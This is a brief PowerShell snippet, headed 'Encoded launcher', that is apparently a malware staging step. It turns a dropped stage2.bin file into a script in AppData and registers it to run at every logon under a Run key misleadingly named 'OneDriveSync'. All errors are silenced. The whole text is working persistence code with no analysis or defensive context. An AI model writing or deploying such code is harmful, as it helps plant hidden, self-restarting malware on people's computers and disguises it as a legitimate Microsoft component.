
# Encoded launcher
try { Copy-Item -Path "$env:APPDATA\stage2.bin" -Destination "$env:APPDATA\updater.ps1" -Force -ErrorAction SilentlyContinue; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\updater.ps1" + '"') -PropertyType String -Force -ErrorAction SilentlyContinue; Write-Verbose "stage marker 31 reached" } catch { Write-Warning "Remote fetch failed" }
